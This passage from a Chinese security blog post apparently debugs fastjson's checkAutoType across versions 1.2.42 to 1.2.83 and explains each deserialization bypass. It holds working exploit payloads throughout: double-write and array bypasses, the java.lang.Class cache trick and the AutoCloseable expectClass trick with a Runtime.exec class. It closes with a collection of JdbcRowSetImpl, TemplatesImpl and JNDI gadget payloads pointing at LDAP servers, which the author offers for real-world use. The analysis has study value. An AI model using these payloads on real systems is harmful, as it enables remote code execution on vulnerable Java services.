+<p>现在checkAutoType方法里面都是各种hash值</p>
+<p>目前来看 确实看不懂和之前有什么区别 </p>
+<p>我们继续调试下去</p>
+<p><img src="/2026/04/24/fastjson/image-20260426140421765.png" alt="image-20260426140421765"></p>
+<p>第一个判断首尾的hash 我们这里的payload过了 猜测实际逻辑和之前没区别</p>
+<p><img src="/2026/04/24/fastjson/image-20260426140646263.png" alt="image-20260426140646263"></p>
+<p>这个h3获取了前3个字符的hash</p>
+<p><img src="/2026/04/24/fastjson/image-20260426140744061.png" alt="image-20260426140744061"></p>
+<p>开始判断白 黑名单 通过判断第四个字符之后的字符 去判断是否和黑名单匹配或者和白名单匹配</p>
+<p><strong>先白后黑</strong></p>
+<p><img src="/2026/04/24/fastjson/image-20260426140924953.png" alt="image-20260426140924953"></p>
+<p>最后也是抛出异常了</p>
+<p>这个版本他<strong>提前判断并删去首尾字符 在去判断白黑名单了</strong></p>
+<p>那么我们试试双写绕过</p>
+<p><img src="/2026/04/24/fastjson/image-20260426141044491.png" alt="image-20260426141044491"></p>
+<p>现在是只有一对<code>L</code>和<code>;</code></p>
+<p>显然是可以绕过黑名单的</p>
+<p><img src="/2026/04/24/fastjson/image-20260426141326394.png" alt="image-20260426141326394"></p>
+<p>依旧进入这个loadclass</p>
+<p><img src="/2026/04/24/fastjson/image-20260426141400756.png" alt="image-20260426141400756"></p>
+<p>这下看懂了</p>
+<p>依旧是原来的工具类里面的loadclass</p>
+<p><img src="/2026/04/24/fastjson/image-20260426141500775.png" alt="image-20260426141500775"></p>
+<p>注意这里的className是最开始的 也就是有2对的形式 但是没关系 实际情况是会迭代调用 也就是会迭代的删去首尾字符</p>
+<p>最后仍然可以加载 所以说一开始的payload至少是要有一对以上的<code>L</code>和<code>;</code>就可以绕过</p>
+<p><img src="/2026/04/24/fastjson/image-20260426141649436.png" alt="image-20260426141649436"></p>
+<p>依旧弹窗了</p>
+<p>数组的话是没有限制的 所以可以直接打</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">payload22</span>  <span class="operator">=</span> <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[&#123;,\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;\t\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:4321/demo\&quot;,\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;\t\&quot;autoCommit\&quot;:\&quot;true\&quot;\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/04/24/fastjson/image-20260426141754214.png" alt="image-20260426141754214"></p>
+<h4 id="总结一下-2"><a href="#总结一下-2" class="headerlink" title="总结一下"></a>总结一下</h4><p>这个版本开始 判断都用到hash了 但是实际逻辑却没有改变 只是搞了hash当幌子罢了</p>
+<p>双写绕过或者数组绕过</p>
+<h3 id="1-2-43"><a href="#1-2-43" class="headerlink" title="1.2.43"></a>1.2.43</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">payload22</span>  <span class="operator">=</span> <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;\&quot;@type\&quot;:\&quot;LLcom.sun.rowset.JdbcRowSetImpl;;\&quot;,\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;\t\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:4321/demo\&quot;,\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;\t\&quot;autoCommit\&quot;:\&quot;true\&quot;\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>依旧双写</p>
+<p><img src="/2026/04/24/fastjson/image-20260426142141482.png" alt="image-20260426142141482"></p>
+<p>依旧是报错了</p>
+<h4 id="分析一下-3"><a href="#分析一下-3" class="headerlink" title="分析一下"></a>分析一下</h4><p><img src="/2026/04/24/fastjson/image-20260426142228592.png" alt="image-20260426142228592"></p>
+<p>直接看checkAutoType方法</p>
+<p>现在第一个判断是嵌套了2个判断 只要双写就直接报错了</p>
+<p>修改的也是简单粗暴 依然没有对数组的限制可以打数组绕过</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">payload22</span>  <span class="operator">=</span> <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[&#123;,\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;\t\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:4321/demo\&quot;,\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;\t\&quot;autoCommit\&quot;:\&quot;true\&quot;\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/04/24/fastjson/image-20260426142423829.png" alt="image-20260426142423829"></p>
+<h4 id="总结一下-3"><a href="#总结一下-3" class="headerlink" title="总结一下"></a>总结一下</h4><p>只能打数组绕过了</p>
+<h3 id="1-2-44"><a href="#1-2-44" class="headerlink" title="1.2.44"></a>1.2.44</h3><p><img src="/2026/04/24/fastjson/image-20260426142521786.png" alt="image-20260426142521786"></p>
+<p>这下是数组也没法绕过了</p>
+<p><img src="/2026/04/24/fastjson/image-20260426142608021.png" alt="image-20260426142608021"></p>
+<p>现在只要开头是<code>[</code> 或者首尾是<code>L</code>和<code>;</code>就直接报错</p>
+<p>至此到这个版本开始 <strong>没法再通过在@type名加点小东西去绕过任意类加载了</strong></p>
+<h4 id="分析一下-4"><a href="#分析一下-4" class="headerlink" title="分析一下"></a>分析一下</h4><p>我们可以根据之前的情况想想还能怎么打</p>
+<p>其实解析的工作可以简单概括为:</p>
+<p>接收json数据判断@type类型 -&gt; 判断@type中的类是否可以被加载 -&gt; 如果可以的话会放入一个mappings中 (可以被加载的类的hash表) -&gt; 之后就是获取这个类的反序列化者 然后反序列化</p>
+<p>在判断类的时候有黑白名单 如果可以<strong>直接绕过黑名单就可以直接打</strong></p>
+<p>也就是找后续版本不在黑名单里面的类去打 </p>
+<p>另一种思路是可以尝试<strong>直接在mappings里面放我们想要加载的类</strong></p>
+<p>当然这些的前提都是建立在AutoTypeSupport为true的前提下 </p>
+<p>其实AutoTypeSupport的情况更为重要 </p>
+<p>因为默认情况AutoTypeSupport为false 所以没有在AutoTypeSupport为false的情况下的打法的话 没有实际意义</p>
+<hr>
+<p>这个版本先跳过</p>
+<hr>
+<h3 id=""><a href="#" class="headerlink" title="&lt;&#x3D;1.2.47"></a>&lt;&#x3D;1.2.47</h3><p>这个版本直接报了个很严重的cve cve2017-18349</p>
+<p>无需AutoTypeSupport为true就可以打</p>
+<p>我们拿大佬的payload去调试看看 具体是个什么情况打出来的</p>
+<p>看之前先看一下这个payload</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.net.Inet4Address&quot;</span>,<span class="string">&quot;val&quot;</span>:<span class="string">&quot;dnslog.com&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个类是在可以被默认的反序列化者的findclass找到 也就是说默认就支持</p>
+<p>但是它的第二个键值对是val</p>
+<p>实际上Inet4Address就没有val这个属性对应的方法</p>
+<p>那么为什么可以打呢</p>
+<p>我们也来调试一下</p>
+<p><img src="/2026/04/24/fastjson/image-20260426150913025.png" alt="image-20260426150913025"></p>
+<p>依旧来到checkAutoType方法</p>
+<p><img src="/2026/04/24/fastjson/image-20260426150943605.png" alt="image-20260426150943605"></p>
+<p>上面肯定是可以过的</p>
+<p><img src="/2026/04/24/fastjson/image-20260426151128404.png" alt="image-20260426151128404"></p>
+<p>来到这个方法这</p>
+<p><img src="/2026/04/24/fastjson/image-20260426151418674.png" alt="image-20260426151418674"></p>
+<p>指定的类可以被找到 虽然不是在mappings中</p>
+<p><img src="/2026/04/24/fastjson/image-20260426151812104.png" alt="image-20260426151812104"></p>
+<p>后续获取deserializer 类名叫MiscCodec是fastjson提供的</p>
+<p>进入deserialize方法</p>
+<p><img src="/2026/04/24/fastjson/image-20260426152011864.png" alt="image-20260426152011864"></p>
+<p>这里要求我们的json数据里面 得有一个键为val 并且得是先@type 再是val</p>
+<p>后续就简单了</p>
+<p><img src="/2026/04/24/fastjson/image-20260426152131102.png" alt="image-20260426152131102"></p>
+<p>获取val的值 放到objVal中 后面又放到strVal中</p>
+<p><img src="/2026/04/24/fastjson/image-20260426152240297.png" alt="image-20260426152240297"></p>
+<p>上面检测一堆类名 最后直接是调用了getByName这个方法 会解析域名 </p>
+<p><img src="/2026/04/24/fastjson/image-20260426152401427.png" alt="image-20260426152401427"></p>
+<p>成功解析</p>
+<p>也就是说 如果是可以允许的类 还必须要有val这个键</p>
+<hr>
+<h4 id="分析一下-5"><a href="#分析一下-5" class="headerlink" title="分析一下"></a>分析一下</h4><p>接下来分析大佬的payload</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">payload3</span>  <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;a\&quot;:&#123;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;&#125;,&quot;</span></span><br><span class="line">        + <span class="string">&quot;\&quot;b\&quot;:&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,&quot;</span></span><br><span class="line">        + <span class="string">&quot;\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:4321/Exploit\&quot;,\&quot;autoCommit\&quot;:true&#125;&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>这里是map里面又有map 嵌套的形式外层的map里面有2个内层map 因此会解析2次</p>
+<p><img src="/2026/04/24/fastjson/image-20260426153939894.png" alt="image-20260426153939894"></p>
+<p>继续调试</p>
+<p><img src="/2026/04/24/fastjson/image-20260426154506228.png" alt="image-20260426154506228"></p>
+<p>这里的上面会判断是不是嵌套的形式 发现是会解析内层的map 于是开始解析内存map</p>
+<p>也就是</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;a&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.Class&quot;</span><span class="punctuation">,</span><span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>从现在开始就是递归调用parseObject去解析数据了</p>
+<p><img src="/2026/04/24/fastjson/image-20260426154957854.png" alt="image-20260426154957854"></p>
+<p>依旧是来到这个地方 可以看到typename是java.lang.Class 显然是一个可以被允许的类</p>
+<p>直接进入checkAutoType</p>
+<p><img src="/2026/04/24/fastjson/image-20260426155145628.png" alt="image-20260426155145628"></p>
+<p><img src="/2026/04/24/fastjson/image-20260426155206619.png" alt="image-20260426155206619"></p>
+<p>返回java.lang.Class的class对象</p>
+<p><img src="/2026/04/24/fastjson/image-20260426155313097.png" alt="image-20260426155313097"></p>
+<p>来到这里 根据之前的分析 应该也会让val的值做些什么</p>
+<p><img src="/2026/04/24/fastjson/image-20260426155411396.png" alt="image-20260426155411396"></p>
+<p>成功来到loadClass 直接会加载val里面的值 </p>
+<p><img src="/2026/04/24/fastjson/image-20260426155509404.png" alt="image-20260426155509404"></p>
+<p>val里面是我们指定的类 在cache为true时可以直接将指定的类放到mappings里面 后续解析的时候就可以成功被加载</p>
+<p><img src="/2026/04/24/fastjson/image-20260426155826528.png" alt="image-20260426155826528"></p>
+<p>后续轮到b中数据做解析 后续就成功加载指定类了</p>
+<p><img src="/2026/04/24/fastjson/image-20260426155919175.png" alt="image-20260426155919175"></p>
+<p>成功解析</p>
+<h4 id="总结一下-4"><a href="#总结一下-4" class="headerlink" title="总结一下"></a>总结一下</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">payload3</span>  <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;a\&quot;:&#123;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;&#125;,&quot;</span></span><br><span class="line">        + <span class="string">&quot;\&quot;b\&quot;:&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,&quot;</span></span><br><span class="line">        + <span class="string">&quot;\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:4321/Exploit\&quot;,\&quot;autoCommit\&quot;:true&#125;&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>这次的绕过方式是<strong>通过 <code>java.lang.Class</code> 反序列化器在反序列化的时候 会自动的在mappings中添加我们的指定类</strong>的方法去加载类</p>
+<p>并且是不需要AutoTypeSupport的</p>
+<p>第一次解析将类注入mappings中 </p>
+<p>第二次解析正式触发漏洞</p>
+<h3 id="1-2-48"><a href="#1-2-48" class="headerlink" title="1.2.48"></a>1.2.48</h3><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>继续如法炮制</p>
+<p>依旧报错</p>
+<p><img src="/2026/04/24/fastjson/image-20260426160453424.png" alt="image-20260426160453424"></p>
+<p><img src="/2026/04/24/fastjson/image-20260426161049628.png" alt="image-20260426161049628"></p>
+<p>在第一次将类加入mappings中 cache默认的设置为了false</p>
+<hr>
+<p>现在好了又给他修了</p>
+<p>要么在饶黑名单 要么就是找一个其他的类 进行二次解析</p>
+<hr>
+<p>也先跳过这个版本</p>
+<h3 id="-1"><a href="#-1" class="headerlink" title="&lt;&#x3D; 1.2.68"></a>&lt;&#x3D; 1.2.68</h3><h4 id="分析一下-6"><a href="#分析一下-6" class="headerlink" title="分析一下"></a>分析一下</h4><p>在这个版本的时候 又有大佬找到了其他思路</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">payloaddd</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;,\&quot;@type\&quot;:\&quot;org.example.VulAutoCloseable\&quot;,\&quot;cmd\&quot;:\&quot;calc\&quot;&#125;&quot;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">VulAutoCloseable</span> <span class="keyword">implements</span> <span class="title class_">AutoCloseable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">VulAutoCloseable</span><span class="params">(String cmd)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(cmd);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">close</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>就不用java.lang.Class 使用其他类org.example.VulAutoCloseable </p>
+<p>这里的绕过方式和之前的也有点不一样了 使用了exceptclass这个参数</p>
+<p>依旧调试 </p>
+<p><img src="/2026/04/24/fastjson/image-20260426200913120.png" alt="image-20260426200913120"></p>
+<p>跟进checkAutoType方法</p>
+<p>这里的expectClass为null</p>
+<p><img src="/2026/04/24/fastjson/image-20260426201113367.png" alt="image-20260426201113367"></p>
+<p>上面会根据expectClass来判断expectClassFlag应该是什么 这里是false</p>
+<p><img src="/2026/04/24/fastjson/image-20260426201050860.png" alt="image-20260426201050860"></p>
+<p>这里获取到这个AutoCloseable接口的class对象</p>
+<p><img src="/2026/04/24/fastjson/image-20260426201246988.png" alt="image-20260426201246988"></p>
+<p>最终返回</p>
+<p><img src="/2026/04/24/fastjson/image-20260426201348532.png" alt="image-20260426201348532"></p>
+<p>获取clazz的deserializer</p>
+<p><img src="/2026/04/24/fastjson/image-20260426201436770.png" alt="image-20260426201436770"></p>
+<p>返回JavaBeanDeserializer</p>
+<p><img src="/2026/04/24/fastjson/image-20260426201550585.png" alt="image-20260426201550585"></p>
+<p>现在开始反序列化</p>
+<p><img src="/2026/04/24/fastjson/image-20260426201700823.png" alt="image-20260426201700823"></p>
+<p>没有匹配到数据的时候 会判断当前的key</p>
+<p><img src="/2026/04/24/fastjson/image-20260426201756161.png" alt="image-20260426201756161"></p>
+<p>上面会判断当前键值也就是org.example.VulAutoCloseable 是否能找到他的deserializer 显然是找不到的</p>
+<p>如果当前的key是@type 又会进入checkAutoType方法 这次带上了expectClass和键值</p>
+<p>跟进checkAutoType</p>
+<p><img src="/2026/04/24/fastjson/image-20260426202232895.png" alt="image-20260426202232895"></p>
+<p>expectClass为AutoCloseable的class对象 因此会判定为true</p>
+<p><img src="/2026/04/24/fastjson/image-20260426202318778.png" alt="image-20260426202318778"></p>
+<p>会进入一次白黑名单检测 这里也没啥用</p>
+<p><img src="/2026/04/24/fastjson/image-20260426202420016.png" alt="image-20260426202420016"></p>
+<p>尝试获取 class对象 显然是没有的</p>
+<p><img src="/2026/04/24/fastjson/image-20260426202445057.png" alt="image-20260426202445057"></p>
+<p>又检查了一次</p>
+<p><img src="/2026/04/24/fastjson/image-20260426202555971.png" alt="image-20260426202555971"></p>
+<p>重点来自这里</p>
+<p>这里除了expectClassFlag其他都是false 因此可以进入判断 </p>
+<p>我们的目标类也被成功loadclass</p>
+<p><img src="/2026/04/24/fastjson/image-20260426202835582.png" alt="image-20260426202835582"></p>
+<p>这里被当前的ClassLoader加载了 成功返回class对象</p>
+<p>由于cache为false没有将这个类加入mappings中</p>
+<p><img src="/2026/04/24/fastjson/image-20260426203023100.png" alt="image-20260426203023100"></p>
+<p>payload最巧妙的地方就在于这里 当expectClass的类是clazz的父类的时候 clazz就可以被添加到mappings中</p>
+<p><img src="/2026/04/24/fastjson/image-20260426203227795.png" alt="image-20260426203227795"></p>
+<p>至此clazz的deserializer也被成功找到 后续反序列化就成功执行代码</p>
+<p> <img src="/2026/04/24/fastjson/image-20260426203323932.png" alt="image-20260426203323932"></p>
+<h4 id="总结一下-5"><a href="#总结一下-5" class="headerlink" title="总结一下"></a>总结一下</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">payloaddd</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;,\&quot;@type\&quot;:\&quot;org.example.VulAutoCloseable\&quot;,\&quot;cmd\&quot;:\&quot;calc\&quot;&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>我们可以试一下 换一个其他父类会怎么样 为什么一定要是<code>java.lang.AutoCloseable</code>呢</p>
+<p>其实理论来说 这里可以是其他符合条件的类</p>
+<p>不在黑名单中并且不是这些类的类</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">else if (expectClass != Object.class &amp;&amp; expectClass != Serializable.class &amp;&amp; expectClass != Cloneable.class &amp;&amp; expectClass != Closeable.class &amp;&amp; expectClass != EventListener.class &amp;&amp; expectClass != Iterable.class &amp;&amp; expectClass != Collection.class) &#123;</span><br></pre></td></tr></table></figure>
+
+<p>这里的绕过方式是通过expectClass绕过AutoType方法</p>
+<h3 id="1-2-68"><a href="#1-2-68" class="headerlink" title="&#x3D;&gt; 1.2.68"></a>&#x3D;&gt; 1.2.68</h3><p>在调试的时候可以明显看到一个东西</p>
+<p><img src="/2026/04/24/fastjson/image-20260426205149577.png" alt="image-20260426205149577"></p>
+<p>自从1.2.68开始 添加了一个safemode 直接把@type功能给砍掉了</p>
+<p>至此 只要safemode添加为true @type就无法生效</p>
+<p>也就没法再加载任意类了</p>
+<p>后续的版本都是在safemode没有为true的前提下打的</p>
+<p>但是<strong>默认情况下safemode就是为false</strong> 提供给开发者一个口子 看开发是否配置了</p>
+<hr>
+<h3 id="1-2-69"><a href="#1-2-69" class="headerlink" title="1.2.69"></a>1.2.69</h3><p>之后的版本</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">payloaddd</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;,\&quot;@type\&quot;:\&quot;org.example.VulAutoCloseable\&quot;,\&quot;cmd\&quot;:\&quot;calc\&quot;&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (expectHash != -<span class="number">8024746738719829346L</span> &amp;&amp; expectHash != <span class="number">3247277300971823414L</span> &amp;&amp; expectHash != -<span class="number">5811778396720452501L</span> &amp;&amp; expectHash != -<span class="number">1368967840069965882L</span> &amp;&amp; expectHash != <span class="number">2980334044947851925L</span> &amp;&amp; expectHash != <span class="number">5183404141909004468L</span> &amp;&amp; expectHash != <span class="number">7222019943667248779L</span> &amp;&amp; expectHash != -<span class="number">2027296626235911549L</span> &amp;&amp; expectHash != -<span class="number">2114196234051346931L</span> &amp;&amp; expectHash != -<span class="number">2939497380989775398L</span>) &#123;</span><br><span class="line">    expectClassFlag = <span class="literal">true</span>;</span><br></pre></td></tr></table></figure>
+
+<p>这个又打不了了 因为在判断expectClass时 不让是java.lang.AutoCloseable了 但是这里也类似于黑名单</p>
+<hr>
+<h3 id="1-2-83"><a href="#1-2-83" class="headerlink" title="1.2.83"></a>1.2.83</h3><p>1.2.83是fastjson1最后的版本</p>
+<p>从1.2.68开始 只需要你safemode设为true 就不会再有fastjson反序列化rce的攻击了</p>
+<h3 id="fastjson2"><a href="#fastjson2" class="headerlink" title="fastjson2"></a>fastjson2</h3><p>从第二代开始 至少现在没有爆出可以rce的cve 最多只有dos的cve</p>
+<p>因为他就不支持@type加载类了</p>
+<hr>
+<p>总的来看 fastjson漏洞的万恶之源就是 <strong>@type可以指定要加载的类</strong> 开始的</p>
+<h2 id="其他-1"><a href="#其他-1" class="headerlink" title="其他"></a>其他</h2><p>从通过黑白名单绕过限制之后</p>
+<p>AutoType实际上好像没有什么用 看起来好像不是true也没什么问题</p>
+<p>从绕过手法上来看确实是这样</p>
+<p>但是如果还想从其他类里面找一些不是黑名单的类 依旧得通过 AutoType为true的方式去加载类</p>
+<p><img src="/2026/04/24/fastjson/image-20260426205523486.png" alt="image-20260426205523486"></p>
+<hr>
+<p><strong>绕过思路基本就是绕黑名单了 要么直接硬刚denylist里面的黑名单 但是这个绕过方法前提还得AutoTypeSupport为true</strong></p>
+<p><strong>要么就是 找expectClass 绕过那个expectHash检测</strong></p>
+<h2 id="payload大全"><a href="#payload大全" class="headerlink" title="payload大全"></a>payload大全</h2><p>这里收录了一些具有实战意义的payload</p>
+<p>JdbcRowSetImpl</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>TemplatesImpl</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;_bytecodes&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;yv66vgA...k=&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    &#x27;_name&#x27;<span class="punctuation">:</span> &#x27;su18&#x27;<span class="punctuation">,</span></span><br><span class="line">    &#x27;_tfactory&#x27;<span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;_outputProperties&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>JndiDataSourceFactory</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;properties&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;data_source&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>SimpleJndiBeanFactory</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.springframework.beans.factory.config.PropertyPathFactoryBean&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;targetBeanName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;propertyPath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;su18&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;beanFactory&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.springframework.jndi.support.SimpleJndiBeanFactory&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;shareableResources&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>DefaultBeanFactoryPointcutAdvisor</p>
